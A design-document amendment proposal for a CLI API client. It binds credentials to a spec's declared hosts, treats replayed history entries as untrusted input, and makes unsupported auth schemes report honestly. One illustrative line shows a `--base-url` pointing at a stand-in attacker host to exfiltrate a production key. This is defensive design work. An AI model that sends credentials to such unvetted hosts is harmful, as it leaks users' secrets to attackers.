# Proposed DESIGN.md amendments — three decisions the review loop cannot make

*Drafted 2026-08-03 · not yet folded into DESIGN.md · awaiting review*

Cycle 2 of the review re-run produced 8 CRIT findings. Five are implementation misses against
the design as written. Three need a decision the design does not currently make, and patching
them without one is why the loop kept rediscovering the same defect in new places.

Each amendment below states **the gap**, **the options**, **the recommendation**, and **the
exact text** to insert. Approve, change, or reject each independently.

---

## Amendment 1 — Credentials bind to hosts

**The gap.** §5a exhaustively covers *does a secret appear in output*. It never asks *which
host may receive it*. So `--base-url https://attacker.example` happily sends your production
key to an attacker, and no rule was violated because no rule exists.

This is the root of review findings 1 and 2. Fixing them individually invents policy; the next
reviewer finds a third instance.

**Options considered**

| Option | Behaviour | Why not |
|---|---|---|
| Bind to the spec's `servers[]` | Credentials go only to declared hosts; anything else needs an explicit flag | **Recommended** |
| Bind to the profile | A profile names its host; off-profile hosts need a profile | Punishes the no-profile path, which is the common agent case |
| Config allowlist per credential | Explicit host list per scheme | Most precise, most setup. Nothing to point at on first run |

**Recommendation: bind to `servers[]`, default-deny, explicit override.** It matches the
pattern §3.5 already establishes with `--allow-mutations` — the dangerous thing requires a
flag a human typed on purpose. It also makes finding 2 disappear rather than needing its own
fix, and it keeps the twin loop working with no ceremony, because the twin needs no real
credentials by design (§6).

### Proposed text — new subsection in §5a, after "How secrets reach curl"

> ### Credentials bind to hosts
>
> **Invariant: a resolved credential is transmitted only to a host the spec declares, or one
> a human has explicitly allowed.**
>
> The allowed host set for a call is:
>
> 1. every host in the spec's `servers[]`, after server-variable substitution; plus
> 2. every host passed as `--allow-host HOST` (repeatable); plus
> 3. every host in `allow_hosts:` in the active profile.
>
> When `--base-url` points outside that set, the request still runs — but **every credential is
> withheld**, and the omission is reported both ways:
>
> - a one-line warning on stderr naming the withheld schemes and the offending host;
> - a machine-readable field in the output envelope, so an agent can act on it rather than
>   inferring it from a downstream 401:
>
> ```json
> "credentials_withheld": [
>   {"scheme": "bearerAuth", "reason": "host not in spec servers[]", "host": "localhost:9000"}
> ]
> ```
>
> Withholding rather than refusing is deliberate: pointing at a local twin is the single most
> common `--base-url` use, and the twin accepts placeholder credentials by design (§6). An
> agent working against the twin must not need a flag, and must not be handed a real secret.
>
> `auth check` reports against the *resolved* host set, so "present" never means "will
> actually be sent".

---

## Amendment 2 — History is untrusted input on read

**The gap.** §5a governs history at **write** time (redact before it touches disk) and says
nothing about **read** time. But a history file is a persistent artifact that may have been
written by a different project, copied between machines, or edited by hand. `history replay`
currently trusts it: review finding 2 showed a stored entry naming an arbitrary env var and an
arbitrary host, turning the credential firewall into a delivery mechanism.

**No real alternatives here** — the only question is how strict. Recommendation: replay
re-derives everything and trusts the entry for nothing that has security consequence.

### Proposed text — new subsection in §5a, after the leak-channel table

> ### History is untrusted input when read
>
> Redaction at write time (above) protects what *leaves* the tool. It says nothing about what
> comes back *in*. A history file is a persistent artifact: it may have been written by another
> project, copied from another machine, or edited by hand. **Every field in a history entry is
> untrusted input.**
>
> `history replay` therefore re-derives rather than replays:
>
> | Field | Treatment on replay |
> |---|---|
> | operationId, params, body | Re-bound through the normal request-construction path, re-validated against the current spec |
> | Credentials | **Never taken from the entry.** Re-resolved from the current environment and profile, subject to the host-binding rule above |
> | Target host | Taken from the current `--base-url`, profile, or spec — never from the stored URL. If the stored entry's host is outside the currently allowed set, replay refuses with exit 2 rather than silently retargeting |
> | Env var names | Only names inside the `TALARIA_AUTH_*` namespace are resolvable. A stored entry naming any other variable is a malformed entry, not a lookup |
> | Sizes and types | Bounded and type-checked before use. A corrupt or hostile entry fails that entry, never the process |
>
> The rule in one line: **a history entry is data, never instruction.**

---

## Amendment 3 — Schemes v1 does not support

**The gap.** §5 says OAuth flows are out of scope, "bring your own token". It never says what
happens when a spec *declares* `oauth2`. Today `auth check` exits 0 reporting nothing is
needed, and then `call` refuses — the one command an agent uses to self-diagnose auth gives an
answer that is simply false.

**Recommendation:** honour the "bring your own token" intent explicitly rather than by accident.

### Proposed text — replace the last bullet of §5 "Auth"

> - v1 resolves `http bearer`, `http basic`, and `apiKey` (header, query, cookie) schemes.
> - A scheme outside that set — `oauth2`, `openIdConnect`, `mutualTLS` — is **unsupported, not
>   invisible**. When an operation requires one:
>   - if `TALARIA_AUTH_BEARER` is set, the scheme is satisfied by that token. This *is* "bring
>     your own token": the user obtained it however the flow demands, and talaria simply
>     carries it;
>   - if it is not set, the operation is unsatisfiable. `auth check` reports
>     `{"scheme":"oauth2","supported":false,"present":false}` and exits 5; `call` and `run`
>     exit 5 with a structured error naming the scheme and the variable to set.
> - `auth check` never reports a scheme as satisfied when the call would refuse it. The two
>   commands agree by construction, or `auth check` is worthless to an agent.

---

## What this unblocks

With these three in place, all 8 of cycle 2's CRIT findings become implementation work with a
specification to converge on:

| Finding | Status after amendment |
|---|---|
| 1. Credential sent to any host `--base-url` names | Amendment 1 |
| 2. `history replay` ships a credential to any host | Amendments 1 + 2 |
| 4. OAuth2 spec silently uncallable, `auth check` exits 0 | Amendment 3 |
| 3. `run` ignores parameter-level `examples` | Already specified — implementation miss |
| 5. Server variables never substituted | Already specified — and Amendment 1 now depends on it |
| 6. `--output tsv` structurally unsound | Already specified — implementation miss |
| 7. Hostile `minLength` causes a Go OOM | Already specified (structured errors) — implementation miss |
| 8. History append rewrites the whole store | Already specified (append-only JSONL) — implementation miss |

Note that **Amendment 1 depends on finding 5**: host binding reads `servers[]`, and server
variables must be substituted before that list means anything. Fix 5 first.
